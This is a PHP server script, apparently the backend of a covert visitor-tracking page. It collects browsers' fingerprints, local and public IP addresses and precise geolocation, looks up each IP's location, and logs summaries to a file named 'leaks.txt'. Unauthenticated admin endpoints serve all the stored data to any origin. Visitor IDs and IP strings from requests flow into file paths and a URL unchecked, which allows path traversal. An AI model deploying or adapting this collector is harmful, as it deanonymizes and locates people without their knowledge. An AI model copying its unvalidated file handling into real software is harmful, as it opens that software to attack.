<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Handle GET requests for admin panel
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $action = $_GET['action'] ?? '';

    switch ($action) {
        case 'list_visitors':
            listVisitors();
            break;
        case 'get_visitor_data':
            getVisitorData($_GET['visitor_id'] ?? '');
            break;
        case 'get_stats':
            getStats();
            break;
        default:
            echo json_encode(['error' => 'Invalid action']);
    }
    exit;
}

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $timestamp = date('Y-m-d H:i:s');
    $visitorId = $data['fingerprintJS']['visitorId'] ?? 'unknown';

    // สร้างโฟลเดอร์สำหรับเก็บข้อมูลแต่ละ visitor
    $visitorDir = "data/{$visitorId}";
    if (!is_dir($visitorDir)) {
        mkdir($visitorDir, 0755, true);
    }

    // บันทึกข้อมูลหลัก
    $mainLog = [
        'timestamp' => $timestamp,
        'visitor_id' => $visitorId,
        'fingerprint_confidence' => $data['fingerprintJS']['confidence'] ?? 0,
        'user_agent' => $data['userAgent'] ?? '',
        'platform' => $data['platform'] ?? '',
        'language' => $data['language'] ?? '',
        'timezone' => $data['timezone'] ?? '',
        'screen_resolution' => $data['screenResolution'] ?? '',
        'local_ips' => $data['localIPs'] ?? [],
        'public_ips' => $data['publicIPs'] ?? [],
        'location' => $data['location'] ?? null,
        'hardware_concurrency' => $data['hardwareConcurrency'] ?? null,
        'device_memory' => $data['deviceMemory'] ?? null,
        'connection' => $data['connection'] ?? null,
        'touch_support' => $data['touchSupport'] ?? false,
        'max_touch_points' => $data['maxTouchPoints'] ?? 0,
        'referrer' => $data['referrer'] ?? '',
        'url' => $data['url'] ?? ''
    ];

    // บันทึกเป็น JSON
    $logFile = "{$visitorDir}/visits.json";
    $existingVisits = [];
    if (file_exists($logFile)) {
        $existingVisits = json_decode(file_get_contents($logFile), true) ?? [];
    }
    $existingVisits[] = $mainLog;
    file_put_contents($logFile, json_encode($existingVisits, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

    // บันทึก fingerprints แยกต่างหาก
    $fingerprints = [
        'timestamp' => $timestamp,
        'fingerprintjs_components' => $data['fingerprintJS']['components'] ?? [],
        'canvas_fingerprint' => $data['canvasFingerprint'] ?? '',
        'webgl_fingerprint' => $data['webglFingerprint'] ?? [],
        'audio_fingerprint' => $data['audioFingerprint'] ?? '',
        'plugins' => $data['plugins'] ?? [],
        'battery' => $data['battery'] ?? null
    ];

    $fpFile = "{$visitorDir}/fingerprints.json";
    $existingFps = [];
    if (file_exists($fpFile)) {
        $existingFps = json_decode(file_get_contents($fpFile), true) ?? [];
    }
    $existingFps[] = $fingerprints;
    file_put_contents($fpFile, json_encode($existingFps, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

    // บันทึก GeoIP สำหรับ Public IPs
    if (!empty($data['publicIPs'])) {
        foreach ($data['publicIPs'] as $ip) {
            $geoFile = "{$visitorDir}/geo_{$ip}.json";
            if (!file_exists($geoFile)) {
                $geo = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
                if ($geo && isset($geo['status']) && $geo['status'] == 'success') {
                    $geoData = [
                        'ip' => $ip,
                        'country' => $geo['country'] ?? '',
                        'countryCode' => $geo['countryCode'] ?? '',
                        'region' => $geo['region'] ?? '',
                        'regionName' => $geo['regionName'] ?? '',
                        'city' => $geo['city'] ?? '',
                        'zip' => $geo['zip'] ?? '',
                        'lat' => $geo['lat'] ?? '',
                        'lon' => $geo['lon'] ?? '',
                        'timezone' => $geo['timezone'] ?? '',
                        'isp' => $geo['isp'] ?? '',
                        'org' => $geo['org'] ?? '',
                        'as' => $geo['as'] ?? '',
                        'query' => $geo['query'] ?? '',
                        'fetched_at' => $timestamp
                    ];
                    file_put_contents($geoFile, json_encode($geoData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
                }
            }
        }
    }

    // บันทึกสรุปสำหรับ admin (ไฟล์หลัก)
    $summary = "[{$timestamp}] Visitor: {$visitorId} | IPs: " . implode(', ', array_merge($data['localIPs'] ?? [], $data['publicIPs'] ?? [])) .
               " | UA: " . substr($data['userAgent'] ?? '', 0, 100) .
               " | Location: " . ($data['location']['latitude'] ?? 'N/A') . "," . ($data['location']['longitude'] ?? 'N/A') .
               " | Device: " . ($data['platform'] ?? 'Unknown') . "\n";

    file_put_contents('leaks.txt', $summary, FILE_APPEND | LOCK_EX);

    // ส่ง response กลับ
    echo json_encode([
        'status' => 'success',
        'visitor_id' => $visitorId,
        'message' => 'Data collected successfully'
    ]);

} else {
    echo json_encode([
        'status' => 'error',
        'message' => 'No data received'
    ]);
}

// Admin functions
function listVisitors() {
    $dataDir = '../data';
    $visitors = [];

    if (is_dir($dataDir)) {
        $visitorDirs = glob($dataDir . '/*', GLOB_ONLYDIR);

        foreach ($visitorDirs as $visitorDir) {
            $visitorId = basename($visitorDir);
            $visitsFile = $visitorDir . '/visits.json';

            if (file_exists($visitsFile)) {
                $visits = json_decode(file_get_contents($visitsFile), true) ?? [];

                // Get the latest visit
                if (!empty($visits)) {
                    $latestVisit = end($visits);
                    $latestVisit['visitor_id'] = $visitorId;
                    $visitors[] = $latestVisit;
                }
            }
        }

        // Sort by timestamp (newest first)
        usort($visitors, function($a, $b) {
            return strtotime($b['timestamp']) - strtotime($a['timestamp']);
        });
    }

    echo json_encode(['visitors' => $visitors]);
}

function getVisitorData($visitorId) {
    if (empty($visitorId)) {
        echo json_encode(['error' => 'Visitor ID required']);
        return;
    }

    $visitorDir = "../data/{$visitorId}";
    $data = ['visitor_id' => $visitorId];

    // Get visits
    $visitsFile = $visitorDir . '/visits.json';
    if (file_exists($visitsFile)) {
        $data['visits'] = json_decode(file_get_contents($visitsFile), true) ?? [];
    }

    // Get fingerprints
    $fpFile = $visitorDir . '/fingerprints.json';
    if (file_exists($fpFile)) {
        $data['fingerprints'] = json_decode(file_get_contents($fpFile), true) ?? [];
    }

    // Get geo data
    $geoFiles = glob($visitorDir . '/geo_*.json');
    $data['geo_data'] = [];
    foreach ($geoFiles as $geoFile) {
        $ip = str_replace(['geo_', '.json'], '', basename($geoFile));
        $data['geo_data'][$ip] = json_decode(file_get_contents($geoFile), true) ?? [];
    }

    echo json_encode($data);
}

function getStats() {
    $dataDir = '../data';
    $stats = [
        'total_visitors' => 0,
        'unique_devices' => 0,
        'today_visits' => 0,
        'avg_confidence' => 0
    ];

    if (is_dir($dataDir)) {
        $visitorDirs = glob($dataDir . '/*', GLOB_ONLYDIR);
        $totalConfidence = 0;
        $confidenceCount = 0;
        $today = date('Y-m-d');

        foreach ($visitorDirs as $visitorDir) {
            $stats['total_visitors']++;
            $visitsFile = $visitorDir . '/visits.json';

            if (file_exists($visitsFile)) {
                $visits = json_decode(file_get_contents($visitsFile), true) ?? [];

                foreach ($visits as $visit) {
                    if (isset($visit['fingerprint_confidence'])) {
                        $totalConfidence += $visit['fingerprint_confidence'];
                        $confidenceCount++;
                    }

                    // Count today's visits
                    if (date('Y-m-d', strtotime($visit['timestamp'])) === $today) {
                        $stats['today_visits']++;
                    }
                }
            }
        }

        $stats['unique_devices'] = $stats['total_visitors'];
        $stats['avg_confidence'] = $confidenceCount > 0 ? ($totalConfidence / $confidenceCount) * 100 : 0;
    }

    echo json_encode($stats);
}
?>
